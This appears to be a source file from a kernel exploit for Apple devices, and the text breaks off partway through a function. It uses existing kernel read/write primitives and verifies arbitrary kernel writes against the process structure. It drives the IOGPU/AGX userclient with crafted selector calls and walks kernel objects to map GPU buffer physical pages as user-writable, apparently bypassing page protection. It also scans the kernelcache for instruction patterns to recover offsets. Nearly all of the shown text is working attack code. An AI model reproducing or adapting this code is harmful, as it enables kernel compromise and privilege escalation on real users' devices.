#include <mach/mach.h>
#include <mach/mach_time.h>
#include <mach/vm_map.h>
#include <mach/thread_info.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#include <limits.h>
#import <Foundation/Foundation.h>
#include <IOKit/IOKitLib.h>
#import <Metal/Metal.h>

#include "kernel_primitives.h"
#include "agx_internal.h"
#include "sptm_bypass.h"
#include "stabilize.h"

extern vm_size_t vm_page_size;
extern int __ulock_wait(uint32_t operation, void *addr, uint64_t value, uint32_t timeout);
extern int __ulock_wake(uint32_t operation, void *addr, uint64_t wake_value);
extern int *__error(void);

#pragma mark - Kernel data write verification

int sptm_kwrite_test(mach_port_t entry_port) {
    kwlog("[kw_test] === KERNEL DATA WRITE TEST ===\n");
    if (!g_krw_state) { kwlog("[kw_test] FAIL: no worker state\n"); return -1; }

    uint64_t proc_kva = kread_get_our_proc();
    if (!proc_kva) { kwlog("[kw_test] FAIL: no proc\n"); return -2; }

    int32_t orig = 0;
    kread_via_thread_state_impl(proc_kva, &orig, 4);
    int32_t test = orig ^ 0x10;

    int wr = kwrite_via_necp_object(proc_kva, &test, 4, 0);
    if (wr) { kwlog("[kw_test] FAIL: write %d\n", wr); return wr; }

    int32_t rb = 0;
    kread_via_thread_state_impl(proc_kva, &rb, 4);
    kwrite_via_necp_object(proc_kva, &orig, 4, 0);

    int32_t fin = 0;
    kread_via_thread_state_impl(proc_kva, &fin, 4);
    kwlog("[kw_test] write=0x%x rb=0x%x restore=0x%x ok=%d\n",
            test, rb, fin, rb == test && fin == orig);
    kwlog("[kw_test] === %s ===\n",
            (rb == test && fin == orig) ? "KERNEL DATA WRITE OK" : "FAILED");
    return (rb == test && fin == orig) ? 0 : -3;
}

#pragma mark - AGX (IOGPU) Userclient -- open + selector 7

typedef struct {
    io_service_t service;
    io_connect_t connect;
    uint32_t sel7_handle;
    uint32_t selF_handle;
    uint32_t selD0_handle;
    uint32_t selD1_handle;
    int      have_sel7;
    int      have_selF;
    int      have_sel19;
    int      have_selD0;
    int      have_selD1;
    int      have_sel1A_0;
    int      have_sel1A_1;
} agx_uc_t;

static int agx_userclient_open(agx_uc_t *uc) {
    memset(uc, 0, sizeof(*uc));

    CFMutableDictionaryRef match = IOServiceMatching("IOGPU");
    if (!match) {
        kwlog("[agx_uc] IOServiceMatching('IOGPU') = NULL\n");
        return -1;
    }
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, match);
    if (svc == IO_OBJECT_NULL) {
        kwlog("[agx_uc] IOServiceGetMatchingService('IOGPU') returned NULL\n");
        return -2;
    }
    kwlog("[agx_uc] matched IOGPU service: 0x%x\n", svc);

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, 1, &conn);
    if (kr) {
        kwlog("[agx_uc] IOServiceOpen(type=1) failed: 0x%x\n", kr);
        IOObjectRelease(svc);
        return -3;
    }
    kwlog("[agx_uc] IOServiceOpen(type=1) OK: connect=0x%x\n", conn);

    uc->service = svc;
    uc->connect = conn;
    return 0;
}

static void agx_userclient_close(agx_uc_t *uc) {
    if (!uc) return;
    if (uc->connect) {
        IOServiceClose(uc->connect);
        uc->connect = 0;
    }
    if (uc->service) {
        IOObjectRelease(uc->service);
        uc->service = 0;
    }
}

static int agx_run_setup(agx_uc_t *uc) {
    kern_return_t kr;

    {
        uint8_t  in7[0x408];
        memset(in7, 0, sizeof(in7));
        uint8_t  out7[64];
        memset(out7, 0, sizeof(out7));
        size_t   out7_cnt = 16;

        kr = IOConnectCallStructMethod(uc->connect, 7,
                                       in7, sizeof(in7),
                                       out7, &out7_cnt);
        if (kr) { kwlog("[agx_uc] sel 7 FAIL: 0x%x\n", kr); return -1; }
        uc->sel7_handle = *(uint32_t *)out7;
        uc->have_sel7 = 1;
        kwlog("[agx_uc] sel 7  OK: handle=0x%x (out_cnt=%zu)\n",
                uc->sel7_handle, out7_cnt);
    }

    {
        uint64_t inF[2]  = { 0x100ULL, 0x20ULL };
        uint8_t  outF[64];
        memset(outF, 0, sizeof(outF));
        size_t   outF_cnt = 16;

        kr = IOConnectCallMethod(uc->connect, 0xF,
                                 inF, 2,
                                 NULL, 0,
                                 NULL, NULL,
                                 outF, &outF_cnt);
        if (kr) { kwlog("[agx_uc] sel 0xF FAIL: 0x%x\n", kr); return -2; }
        uc->selF_handle = *(uint32_t *)(outF + 8);
        uc->have_selF = 1;
        kwlog("[agx_uc] sel 0xF OK: handle=0x%x (out_cnt=%zu)\n",
                uc->selF_handle, outF_cnt);
    }

    {
        uint64_t in19[2] = { (uint64_t)uc->sel7_handle, (uint64_t)uc->selF_handle };
        kr = IOConnectCallScalarMethod(uc->connect, 0x19,
                                       in19, 2,
                                       NULL, NULL);
        if (kr) { kwlog("[agx_uc] sel 0x19 FAIL: 0x%x\n", kr); return -3; }
        uc->have_sel19 = 1;
        kwlog("[agx_uc] sel 0x19 OK\n");
    }

    {
        uint64_t inD[2] = { (uint64_t)vm_page_size, 0ULL };
        uint8_t  outD[64];
        memset(outD, 0, sizeof(outD));
        size_t   outD_cnt = 16;

        kr = IOConnectCallMethod(uc->connect, 0xD,
                                 inD, 2,
                                 NULL, 0,
                                 NULL, NULL,
                                 outD, &outD_cnt);
        if (kr) { kwlog("[agx_uc] sel 0xD #1 FAIL: 0x%x\n", kr); return -4; }
        uc->selD0_handle = *(uint32_t *)(outD + 12);
        uc->have_selD0 = 1;
        kwlog("[agx_uc] sel 0xD #1 OK: handle=0x%x (out_cnt=%zu)\n",
                uc->selD0_handle, outD_cnt);
    }

    {
        uint64_t inD[2] = { (uint64_t)vm_page_size, 0ULL };
        uint8_t  outD[64];
        memset(outD, 0, sizeof(outD));
        size_t   outD_cnt = 16;

        kr = IOConnectCallMethod(uc->connect, 0xD,
                                 inD, 2,
                                 NULL, 0,
                                 NULL, NULL,
                                 outD, &outD_cnt);
        if (kr) { kwlog("[agx_uc] sel 0xD #2 FAIL: 0x%x\n", kr); return -5; }
        uc->selD1_handle = *(uint32_t *)(outD + 12);
        uc->have_selD1 = 1;
        kwlog("[agx_uc] sel 0xD #2 OK: handle=0x%x\n", uc->selD1_handle);
    }

    {
        uint64_t in1A_scalars[4] = {
            (uint64_t)uc->sel7_handle,
            0ULL,
            1ULL,
            56ULL,
        };
        uint8_t  in1A_struct[56];
        memset(in1A_struct, 0, sizeof(in1A_struct));
        memcpy(in1A_struct + 0, &uc->selD0_handle, 4);
        memcpy(in1A_struct + 4, &uc->selD0_handle, 4);

        kr = IOConnectCallMethod(uc->connect, 0x1A,
                                 in1A_scalars, 4,
                                 in1A_struct, sizeof(in1A_struct),
                                 NULL, NULL,
                                 NULL, NULL);
        if (kr) { kwlog("[agx_uc] sel 0x1A #1 FAIL: 0x%x\n", kr); return -6; }
        uc->have_sel1A_0 = 1;
        kwlog("[agx_uc] sel 0x1A #1 OK\n");
    }

    {
        uint64_t in1A_scalars[4] = {
            (uint64_t)uc->sel7_handle,
            0ULL,
            1ULL,
            56ULL,
        };
        uint8_t  in1A_struct[56];
        memset(in1A_struct, 0, sizeof(in1A_struct));
        memcpy(in1A_struct + 0, &uc->selD0_handle, 4);
        memcpy(in1A_struct + 4, &uc->selD1_handle, 4);

        kr = IOConnectCallMethod(uc->connect, 0x1A,
                                 in1A_scalars, 4,
                                 in1A_struct, sizeof(in1A_struct),
                                 NULL, NULL,
                                 NULL, NULL);
        if (kr) { kwlog("[agx_uc] sel 0x1A #2 FAIL: 0x%x\n", kr); return -7; }
        uc->have_sel1A_1 = 1;
        kwlog("[agx_uc] sel 0x1A #2 OK\n");
    }

    kwlog("[agx_uc] setup complete (7 selectors)\n");
    return 0;
}

agx_runtime_offsets_t g_agx_off;

#pragma mark - Shared kernel-read + AGX object / GPU-VA helpers

agx_walk_t g_agx_walk;

static int g_discriminator_result = INT_MIN;
int agx_get_discriminator_result(void) { return g_discriminator_result; }

agx_fw_state_t g_agx_fw;

int kread_qword(uint64_t kva, uint64_t *out) {
    return kread_via_thread_state_impl(kva, out, 8) == KERN_SUCCESS ? 0 : -1;
}

#ifndef AGX_KPTR_STRIP
#define AGX_KPTR_STRIP(v) (((v) & 0x0080000000000000ULL) ? ((v) | 0xFFFFFF8000000000ULL) : (v))
#endif

int agx_pg_unsafe(uint64_t pg) {
    uint64_t pte = 0, pa = 0;
    if (kernel_pte_walk_full(pg & ~0x3FFFULL, NULL, &pte, &pa)) return 1;
    if ((pte & 3) != 3) return 1;
    pa &= ~0x3FFFULL;
    return (pa < 0x800000000ULL || pa >= 0x980000000ULL);
}
int agx_kr64(uint64_t kva, uint64_t *out) {
    if (kernel_pte_walk_full(kva & ~0x3FFFULL, NULL, NULL, NULL)) return -1;
    uint64_t v = 0;
    if (kread_qword(kva, &v)) return -1;
    *out = AGX_KPTR_STRIP(v);
    return 0;
}
static uint64_t agx_resolve_connect_uc(uint64_t ipc_port) {
    uint64_t kobj_raw = ipc_port_get_kobject(ipc_port);
    if (!kobj_raw || !agx_kva_ok(kobj_raw)) return 0;
    uint64_t uc = 0;
    if (agx_kr64(kobj_raw + 48, &uc) || !uc) return 0;
    if (uc & 0x0080000000000000ULL) uc |= 0xFFFFFF8000000000ULL;
    if (!agx_kva_ok(uc)) return 0;
    return uc;
}
static uint64_t agx_conn_class_vtable(io_connect_t conn) {
    uint64_t ipc = resolve_port_to_ipc_port(conn);
    if (!ipc || !agx_kva_ok(ipc)) return 0;
    uint64_t uc = agx_resolve_connect_uc(ipc);
    if (!uc) return 0;
    uint64_t vt = 0;
    if (agx_kr64(uc, &vt) || !agx_kva_ok(vt)) return 0;
    return vt;
}

int kva_is_heap(uint64_t p) {
    return (p & 0x7ULL) == 0 &&
           p >= 0xFFFFFFD000000000ULL && p < 0xFFFFFFF000000000ULL;
}

#pragma mark - Guarded kernel-read helper (GPU-PA-safe) + in-process Metal globals

int agx_kr64_dg(uint64_t kva, uint64_t *out) {
    if (kva & 0x7ULL) return -1;
    uint64_t pte0 = 0, pte1 = 0;
    if (kernel_pte_walk_full(kva & ~0x3FFFULL, NULL, &pte0, NULL)) return -1;
    if (kernel_pte_walk_full((kva + 0x218) & ~0x3FFFULL, NULL, &pte1, NULL)) return -1;
    uint64_t pa0 = pte0 & 0xFFFFFFFC000ULL, pa1 = pte1 & 0xFFFFFFFC000ULL;
    if ((pa0 >= 0x200000000ULL && pa0 < 0x280000000ULL) ||
        (pa1 >= 0x200000000ULL && pa1 < 0x280000000ULL)) return -2;
    if ((pte0 & 3) != 3) return -1;
    if (pa0 < 0x800000000ULL || pa0 >= 0x980000000ULL) return -1;
    return kread_qword(kva, out) ? -1 : 0;
}
static id<MTLDevice>       g_mtl_dev = nil;
static id<MTLCommandQueue> g_mtl_q = nil;
static id<MTLBuffer>       g_mtl_a   = nil;
static id<MTLBuffer>       g_mtl_b   = nil;

#pragma mark - Metal helpers (queue / blits / render keepalive)

int agx_metal_setup(void) {
    if (g_mtl_q) return 1;
    g_mtl_dev = MTLCreateSystemDefaultDevice();
    if (!g_mtl_dev) { kwlog("[cq] Metal: no device\n"); return 0; }
    g_mtl_q = [g_mtl_dev newCommandQueue];
    g_mtl_a = [g_mtl_dev newBufferWithLength:0x40000 options:MTLResourceStorageModeShared];
    g_mtl_b = [g_mtl_dev newBufferWithLength:0x40000 options:MTLResourceStorageModeShared];
    if (!g_mtl_q || !g_mtl_a || !g_mtl_b) { kwlog("[cq] Metal: queue/buffers FAILED\n"); g_mtl_q = nil; return 0; }
    return 1;
}

void agx_metal_blits(int n) {
    if (!g_mtl_q) return;
    for (int i = 0; i < n; i++) { @autoreleasepool {
        id<MTLCommandBuffer> cb = [g_mtl_q commandBuffer];
        id<MTLBlitCommandEncoder> bl = [cb blitCommandEncoder];
        [bl copyFromBuffer:g_mtl_a sourceOffset:0 toBuffer:g_mtl_b destinationOffset:0 size:0x40000];
        [bl endEncoding]; [cb commit]; [cb waitUntilCompleted];
    } }
}
static id<MTLRenderPipelineState> g_mtl_rps = nil;
static id<MTLTexture>             g_mtl_tex = nil;
static int agx_metal_render_setup(void) {
    if (!agx_metal_setup()) return 0;
    if (g_mtl_rps) return 1;
    @autoreleasepool {
        NSError *err = nil;
        NSString *src = @"#include <metal_stdlib>\nusing namespace metal;\n"
            @"vertex float4 vs(uint vid [[vertex_id]]) { float2 p[3]={float2(-1,-1),float2(3,-1),float2(-1,3)}; return float4(p[vid],0,1); }\n"
            @"fragment float4 fs() { return float4(1,0.5,0.2,1); }";
        id<MTLLibrary> lib = [g_mtl_dev newLibraryWithSource:src options:nil error:&err];
        if (!lib) { kwlog("[render] lib FAILED: %s\n", err.localizedDescription.UTF8String ?: "?"); return 0; }
        MTLRenderPipelineDescriptor *pd = [[MTLRenderPipelineDescriptor alloc] init];
        pd.vertexFunction   = [lib newFunctionWithName:@"vs"];
        pd.fragmentFunction = [lib newFunctionWithName:@"fs"];
        pd.colorAttachments[0].pixelFormat = MTLPixelFormatBGRA8Unorm;
        g_mtl_rps = [g_mtl_dev newRenderPipelineStateWithDescriptor:pd error:&err];
        if (!g_mtl_rps) { kwlog("[render] pipeline FAILED: %s\n", err.localizedDescription.UTF8String ?: "?"); return 0; }
        MTLTextureDescriptor *td = [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm width:256 height:256 mipmapped:NO];
        td.usage = MTLTextureUsageRenderTarget; td.storageMode = MTLStorageModePrivate;
        g_mtl_tex = [g_mtl_dev newTextureWithDescriptor:td];
        if (!g_mtl_tex) { kwlog("[render] texture FAILED\n"); return 0; }
    }
    return 1;
}
static MTLRenderPassDescriptor *agx_render_pass(void) {
    MTLRenderPassDescriptor *rp = [MTLRenderPassDescriptor renderPassDescriptor];
    rp.colorAttachments[0].texture     = g_mtl_tex;
    rp.colorAttachments[0].loadAction  = MTLLoadActionClear;
    rp.colorAttachments[0].storeAction = MTLStoreActionStore;
    rp.colorAttachments[0].clearColor  = MTLClearColorMake(0,0,0,1);
    return rp;
}
static void agx_metal_render(int n) {
    if (!g_mtl_q || !g_mtl_rps) return;
    for (int i=0;i<n;i++){ @autoreleasepool {
        id<MTLCommandBuffer> cb = [g_mtl_q commandBuffer];
        id<MTLRenderCommandEncoder> re = [cb renderCommandEncoderWithDescriptor:agx_render_pass()];
        [re setRenderPipelineState:g_mtl_rps];
        [re drawPrimitives:MTLPrimitiveTypeTriangle vertexStart:0 vertexCount:3];
        [re endEncoding]; [cb commit]; [cb waitUntilCompleted];
    } }
}
static volatile int g_rr_run = 0; static volatile uint64_t g_rr_submits = 0; static pthread_t g_rr_th;
static void *agx_render_keepalive_thread(void *arg) {
    (void)arg;
    @autoreleasepool {
        dispatch_semaphore_t sem = dispatch_semaphore_create(16);
        while (g_rr_run) {
            dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
            @autoreleasepool {
                id<MTLCommandBuffer> cb = [g_mtl_q commandBuffer];
                id<MTLRenderCommandEncoder> re = [cb renderCommandEncoderWithDescriptor:agx_render_pass()];
                [re setRenderPipelineState:g_mtl_rps];
                [re drawPrimitives:MTLPrimitiveTypeTriangle vertexStart:0 vertexCount:3];
                [re endEncoding];
                [cb addCompletedHandler:^(id<MTLCommandBuffer> c){ (void)c; dispatch_semaphore_signal(sem); }];
                [cb commit]; g_rr_submits++;
            }
        }
        for (int k=0;k<16;k++) dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 200LL*1000*1000));
    }
    return NULL;
}
static void agx_render_keepalive_start(void) {
    if (g_rr_run) return;
    if (!agx_metal_render_setup()) { kwlog("[rr] render setup FAILED\n"); return; }
    g_rr_run = 1; g_rr_submits = 0;
    if (pthread_create(&g_rr_th, NULL, agx_render_keepalive_thread, NULL)!=0){ g_rr_run=0; kwlog("[rr] keepalive pthread FAILED\n"); }
}
static void agx_render_keepalive_stop(void) { if (!g_rr_run) return; g_rr_run = 0; pthread_join(g_rr_th, NULL); }

#pragma mark - Setup: structure walk -> AGX kobject -> firmware state -> map GPU buffers

int agx_setup_walk(agx_uc_t *uc) {
    kwlog("[walk] === SETUP: STRUCTURE WALK + GPU BUFFER MAP ===\n");
    memset(&g_agx_walk, 0, sizeof(g_agx_walk));

    if (!uc || !uc->connect) {
        kwlog("[walk] FAIL: userclient handle missing\n");
        return -1;
    }
    if (!g_agx_off.have[0] || !g_agx_off.have[2] || !g_agx_off.have[8] ||
        !g_agx_off.have[9] || !g_agx_off.have[10] || !g_agx_off.have[11]) {
        kwlog("[walk] FAIL: required offsets not extracted (Kcache scan incomplete)\n");
        return -2;
    }

    uint64_t ipc_port_kva = resolve_port_to_ipc_port(uc->connect);
    if (!ipc_port_kva) { kwlog("[walk] FAIL: resolve_port_to_ipc_port\n"); return -3; }
    uint64_t kobj_raw = ipc_port_get_kobject(ipc_port_kva);
    if (!kobj_raw) { kwlog("[walk] FAIL: ipc_port_get_kobject\n"); return -4; }
    uint64_t kobj = 0;
    if (kread_qword(kobj_raw + 48, &kobj) || !kobj) {
        kwlog("[walk] FAIL: kread kobj_raw+48 = 0x%llx\n",
                (unsigned long long)(kobj_raw + 48));
        return -5;
    }
    if (kobj & 0x0080000000000000ULL) kobj |= 0xFFFFFF8000000000ULL;
    g_agx_walk.kobj = kobj;
    kwlog("[walk] port=0x%x ipc_port=0x%llx kobj_raw=0x%llx kobj(+48)=0x%llx\n",
            uc->connect,
            (unsigned long long)ipc_port_kva,
            (unsigned long long)kobj_raw,
            (unsigned long long)kobj);

    if (kread_qword(kobj + g_agx_off.v42, &g_agx_walk.step1)) {
        kwlog("[walk] FAIL: kread step1 at 0x%llx\n",
                (unsigned long long)(kobj + g_agx_off.v42));
        return -6;
    }
    kwlog("[walk] step1 = *(0x%llx + 0x%x) = 0x%llx\n",
            (unsigned long long)kobj, g_agx_off.v42,
            (unsigned long long)g_agx_walk.step1);

    if (kread_qword(g_agx_walk.step1 + g_agx_off.v50, &g_agx_walk.v299)) {
        kwlog("[walk] FAIL: kread v299\n"); return -7;
    }
    kwlog("[walk] v299  = *(step1 + 0x%x) = 0x%llx\n",
            g_agx_off.v50, (unsigned long long)g_agx_walk.v299);

    if (kread_qword(g_agx_walk.v299 + g_agx_off.v51, &g_agx_walk.v298)) {
        kwlog("[walk] FAIL: kread v298\n"); return -8;
    }
    kwlog("[walk] v298  = *(v299  + 0x%x) = 0x%llx\n",
            g_agx_off.v51, (unsigned long long)g_agx_walk.v298);

    if (kread_qword(g_agx_walk.v298 + 8ULL * uc->selD0_handle, &g_agx_walk.v297)) {
        kwlog("[walk] FAIL: kread v297\n"); return -9;
    }
    if (kread_qword(g_agx_walk.v298 + 8ULL * uc->selD1_handle, &g_agx_walk.v296)) {
        kwlog("[walk] FAIL: kread v296\n"); return -10;
    }
    kwlog("[walk] v297  = *(v298  + 8*0x%x = +0x%llx) = 0x%llx\n",
            uc->selD0_handle, 8ULL * uc->selD0_handle,
            (unsigned long long)g_agx_walk.v297);
    kwlog("[walk] v296  = *(v298  + 8*0x%x = +0x%llx) = 0x%llx\n",
            uc->selD1_handle, 8ULL * uc->selD1_handle,
            (unsigned long long)g_agx_walk.v296);

    if (kread_qword(g_agx_walk.v297 + g_agx_off.v52, &g_agx_walk.v295)) {
        kwlog("[walk] FAIL: kread v295\n"); return -11;
    }
    if (kread_qword(g_agx_walk.v296 + g_agx_off.v52, &g_agx_walk.v294)) {
        kwlog("[walk] FAIL: kread v294\n"); return -12;
    }
    kwlog("[walk] v295  = *(v297  + 0x%x) = 0x%llx\n",
            g_agx_off.v52, (unsigned long long)g_agx_walk.v295);
    kwlog("[walk] v294  = *(v296  + 0x%x) = 0x%llx\n",
            g_agx_off.v52, (unsigned long long)g_agx_walk.v294);

    if (kread_qword(g_agx_walk.v295 + g_agx_off.v53, &g_agx_walk.buf1_kva)) {
        kwlog("[walk] FAIL: kread buf1_kva\n"); return -13;
    }
    if (kread_qword(g_agx_walk.v294 + g_agx_off.v53, &g_agx_walk.buf2_kva)) {
        kwlog("[walk] FAIL: kread buf2_kva\n"); return -14;
    }
    kwlog("[walk] buf1_kva = *(v295 + 0x%x) = 0x%llx\n",
            g_agx_off.v53, (unsigned long long)g_agx_walk.buf1_kva);
    kwlog("[walk] buf2_kva = *(v294 + 0x%x) = 0x%llx\n",
            g_agx_off.v53, (unsigned long long)g_agx_walk.buf2_kva);

    uint64_t page_mask = kwrite_get_page_mask();
    uint64_t buf1_pa = kva_to_pa(g_agx_walk.buf1_kva);
    uint64_t buf2_pa = kva_to_pa(g_agx_walk.buf2_kva);
    if (!buf1_pa) { kwlog("[walk] FAIL: kva_to_pa(buf1)\n"); return -15; }
    if (!buf2_pa) { kwlog("[walk] FAIL: kva_to_pa(buf2)\n"); return -16; }
    g_agx_walk.buf1_pa = buf1_pa & ~page_mask;
    g_agx_walk.buf2_pa = buf2_pa & ~page_mask;
    kwlog("[walk] buf1_pa = 0x%llx (page-aligned 0x%llx)\n",
            (unsigned long long)buf1_pa, (unsigned long long)g_agx_walk.buf1_pa);
    kwlog("[walk] buf2_pa = 0x%llx (page-aligned 0x%llx)\n",
            (unsigned long long)buf2_pa, (unsigned long long)g_agx_walk.buf2_pa);

    int mr1 = ppl_make_writable_page(g_agx_walk.buf1_pa, &g_agx_walk.buf1_map);
    if (mr1) { kwlog("[walk] FAIL: ppl_make_writable_page(buf1_pa) = %d\n", mr1); return -17; }
    kwlog("[walk] buf1 mapped at user VA 0x%llx (kobj=0x%llx)\n",
            (unsigned long long)g_agx_walk.buf1_map.mapped_addr,
            (unsigned long long)g_agx_walk.buf1_map.kobj_addr);

    int mr2 = ppl_make_writable_page(g_agx_walk.buf2_pa, &g_agx_walk.buf2_map);
    if (mr2) {
        ppl_writable_page_free(&g_agx_walk.buf1_map);
        kwlog("[walk] FAIL: ppl_make_writable_page(buf2_pa) = %d\n", mr2);
        return -18;
    }
    kwlog("[walk] buf2 mapped at user VA 0x%llx (kobj=0x%llx)\n",
            (unsigned long long)g_agx_walk.buf2_map.mapped_addr,
            (unsigned long long)g_agx_walk.buf2_map.kobj_addr);

    kwlog("[walk] === SETUP OK -- GPU buffers mapped RW ===\n");
    return 0;
}

#pragma mark - agx_userclient_setup_test (userclient validation)
int agx_userclient_setup_test(void) {
    kwlog("[uc_test] === AGX USERCLIENT SETUP TEST (Userclient) ===\n");

    agx_uc_t uc;
    int rc = agx_userclient_open(&uc);
    if (rc) {
        kwlog("[uc_test] FAIL at agx_userclient_open: %d\n", rc);
        return -1;
    }

    rc = agx_run_setup(&uc);
    if (rc) {
        kwlog("[uc_test] FAIL: setup returned %d\n", rc);
        agx_userclient_close(&uc);
        return -2;
    }

    kwlog("[uc_test] all 7 selectors returned success.\n");
    kwlog("[uc_test] handles: sel7=0x%x selF=0x%x selD0=0x%x selD1=0x%x\n",
            uc.sel7_handle, uc.selF_handle, uc.selD0_handle, uc.selD1_handle);
    kwlog("[uc_test] === Userclient COMPLETE -- userclient armed ===\n");

    agx_userclient_close(&uc);
    return 0;
}

#pragma mark - kcache pattern scanner -- locate IOGPU kext

static int kc_kread(uint64_t kva, void *buf, size_t len) {
    return kread_via_thread_state_impl(kva, buf, len);
}

static uint64_t kc_find_fileset_entry_prefix(uint64_t kc_mh_kva,
        const char *name, size_t prefix_len);

static uint64_t kc_find_fileset_entry(uint64_t kc_mh_kva, const char *name) {
    return kc_find_fileset_entry_prefix(kc_mh_kva, name, 0);
}

static uint64_t kc_find_fileset_entry_prefix(uint64_t kc_mh_kva, const char *name, size_t prefix_len) {
    uint8_t hdr[32];
    if (kc_kread(kc_mh_kva, hdr, sizeof(hdr)) != KERN_SUCCESS) {
        kwlog("[kcfse] FAIL: read MH @ 0x%llx\n", (unsigned long long)kc_mh_kva);
        return 0;
    }
    uint32_t magic      = *(uint32_t *)hdr;
    uint32_t filetype   = *(uint32_t *)(hdr + 12);
    uint32_t ncmds      = *(uint32_t *)(hdr + 16);
    uint32_t sizeofcmds = *(uint32_t *)(hdr + 20);
    kwlog("[kcfse] MH @ 0x%llx: magic=0x%x ft=%u ncmds=%u sz=0x%x\n",
            (unsigned long long)kc_mh_kva, magic, filetype, ncmds, sizeofcmds);
    if (magic != 0xfeedfacf || sizeofcmds == 0) return 0;

    size_t name_full = strlen(name);
    size_t name_match_len = (prefix_len == 0) ? name_full : prefix_len;
    int prefix_mode = (prefix_len > 0 && prefix_len < name_full + 1);

    uint64_t lc_ptr = kc_mh_kva + sizeof(hdr);
    uint64_t lc_end = lc_ptr + sizeofcmds;
    uint32_t fileset_seen = 0;

    while (lc_ptr < lc_end) {
        uint8_t lc_hdr[8];
        if (kc_kread(lc_ptr, lc_hdr, 8) != KERN_SUCCESS) {
            kwlog("[kcfse] FAIL: read LC hdr @ 0x%llx\n", (unsigned long long)lc_ptr);
            break;
        }
        uint32_t cmd     = *(uint32_t *)lc_hdr;
        uint32_t cmdsize = *(uint32_t *)(lc_hdr + 4);
        if (cmdsize == 0) break;

        if (cmd == 0x80000035) {
            fileset_seen++;
            uint8_t lc[256];
            size_t to_read = cmdsize < sizeof(lc) ? cmdsize : sizeof(lc);
            if (kc_kread(lc_ptr, lc, to_read) == KERN_SUCCESS) {
                uint64_t vmaddr  = *(uint64_t *)(lc + 8);
                uint32_t name_off = *(uint32_t *)(lc + 24);
                if (name_off >= 32 && name_off < to_read) {
                    const char *entry_name = (const char *)(lc + name_off);
                    size_t avail = to_read - name_off;
                    size_t nlen  = strnlen(entry_name, avail);
                    if (nlen > 0 && nlen < avail) {
                        int matched = 0;
                        if (prefix_mode) {
                            if (nlen >= name_match_len &&
                                memcmp(entry_name, name, name_match_len) == 0) {
                                matched = 1;
                            }
                        } else {
                            if (nlen == name_match_len &&
                                memcmp(entry_name, name, name_match_len) == 0) {
                                matched = 1;
                            }
                        }
                        if (matched) {
                            kwlog("[kcfse] FOUND prefix='%s'(%zu) -> '%s' vmaddr=0x%llx (entry %u)\n",
                                    name, name_match_len, entry_name,
                                    (unsigned long long)vmaddr, fileset_seen);
                            return vmaddr;
                        }
                    }
                }
            }
        }
        lc_ptr += cmdsize;
    }

    kwlog("[kcfse] prefix='%s'(%zu) NOT FOUND after %u fileset entries\n",
            name, name_match_len, fileset_seen);
    return 0;
}

static int macho_find_segment(uint64_t mh_kva, const char *segname,
                              uint64_t *out_vaddr, uint64_t *out_vsize) {
    uint8_t hdr[32];
    if (kc_kread(mh_kva, hdr, 32) != KERN_SUCCESS) return -1;
    uint32_t ncmds = *(uint32_t *)(hdr + 16);

    size_t namelen = strnlen(segname, 16);
    uint64_t cmd_off = mh_kva + 32;
    for (uint32_t i = 0; i < ncmds && i < 256; i++) {
        uint8_t lc[72];
        if (kc_kread(cmd_off, lc, 72) != KERN_SUCCESS) return -1;
        uint32_t cmd     = *(uint32_t *)lc;
        uint32_t cmdsize = *(uint32_t *)(lc + 4);
        if (cmdsize == 0) return -1;
        if (cmd == 0x19) {
            char this_segname[17];
            memcpy(this_segname, lc + 8, 16);
            this_segname[16] = 0;
            if (strncmp(this_segname, segname, 16) == 0 &&
                strnlen(this_segname, 16) == namelen) {
                *out_vaddr = *(uint64_t *)(lc + 24);
                *out_vsize = *(uint64_t *)(lc + 32);
                return 0;
            }
        }
        cmd_off += cmdsize;
    }
    return -1;
}

static long scan_insn_pattern(const uint32_t *buf, size_t count,
                              const uint32_t *pat, const uint32_t *mask, int n) {
    if ((size_t)n > count) return -1;
    for (size_t i = 0; i + (size_t)n <= count; i++) {
        int ok = 1;
        for (int j = 0; j < n; j++) {
            if ((buf[i + j] & mask[j]) != pat[j]) { ok = 0; break; }
        }
        if (ok) return (long)i;
    }
    return -1;
}

static uint32_t extract_ldr_str_imm(uint32_t insn) {
    uint32_t size  = (insn >> 30) & 0x3;
    uint32_t imm12 = (insn >> 10) & 0xFFF;
    return imm12 << size;
}

static uint32_t *g_iogpu_te_buf = NULL;
static uint64_t  g_iogpu_te_vaddr = 0;
static uint64_t  g_iogpu_te_vsize = 0;
static uint64_t  g_iogpu_mh_kva = 0;

static uint32_t *g_agxg_te_buf = NULL;
static uint64_t  g_agxg_te_vaddr = 0;
static uint64_t  g_agxg_te_vsize = 0;
static uint64_t  g_agxg_mh_kva = 0;

static uint32_t *g_xnu_te_buf = NULL;
static uint64_t  g_xnu_te_vaddr = 0;
static uint64_t  g_xnu_te_vsize = 0;
static uint64_t  g_xnu_mh_kva = 0;

static int agx_load_kext_text_exec(uint64_t mh_kva, const char *tag,
        uint32_t **out_buf, uint64_t *out_vaddr, uint64_t *out_vsize) {
    uint64_t te_vaddr = 0, te_vsize = 0;
    if (macho_find_segment(mh_kva, "__TEXT_EXEC", &te_vaddr, &te_vsize) != 0) {
        kwlog("[load_te:%s] FAIL: __TEXT_EXEC not found\n", tag);
        return -1;
    }
    kwlog("[load_te:%s] __TEXT_EXEC vaddr=0x%llx vsize=0x%llx\n",
            tag, (unsigned long long)te_vaddr, (unsigned long long)te_vsize);
    if (te_vsize == 0 || te_vsize > 0x1000000) {
        kwlog("[load_te:%s] FAIL: unexpected vsize\n", tag);
        return -2;
    }

    uint32_t *buf = (uint32_t *)malloc(te_vsize);
    if (!buf) {
        kwlog("[load_te:%s] FAIL: malloc(%llu)\n", tag, (unsigned long long)te_vsize);
        return -3;
    }

    kwlog("[load_te:%s] reading %llu bytes via kread...\n",
            tag, (unsigned long long)te_vsize);
    kern_return_t kr = kread_via_thread_state_impl(te_vaddr, buf, (uint32_t)te_vsize);
    if (kr != KERN_SUCCESS) {
        kwlog("[load_te:%s] FAIL: kread returned 0x%x\n", tag, kr);
        free(buf);
        return -4;
    }
    kwlog("[load_te:%s] loaded: first insns 0x%08x 0x%08x 0x%08x\n",
            tag, buf[0], buf[1], buf[2]);

